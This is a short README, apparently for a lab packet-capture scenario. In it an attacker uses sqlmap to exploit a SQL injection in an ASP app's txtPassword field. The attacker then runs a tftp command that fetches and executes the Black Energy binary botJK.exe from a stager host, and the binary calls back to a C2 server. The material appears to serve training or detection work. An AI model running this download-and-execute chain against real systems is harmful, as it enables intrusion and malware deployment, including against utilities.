READ ME Black Energy

Scenario

Attacker: Kali 192.168.91.130
Tool: Sql Map
Target: SQL Express 2005/XPSP2 192.168.91.142
Target Application: ASP
SQLi Vulnerable Parameter: txtPassword
Stager: 192.168.91.151 (TFTP Server)
Malicious binary: botJK.exe (Black Energy)
Black Energy C2: 192.168.4.140 

Attacker first probes target (142) by simply inserting ' into form, the proceeds to execute sqlmap against target from (130)
attacker successfuly SQLinjects target and executes command tftp -i GET 192.168.91.151 botJK.exe && botJK.exe. This command chained
is followed by out bound connection to Black Energy C2 (140). Then all you can see in the packet capture is the SQLi os shell from Kali and 
C2 call back to Black Energy C2.

~Feel free to change the Ips to mimic, Russian attack against Ukraine utility~
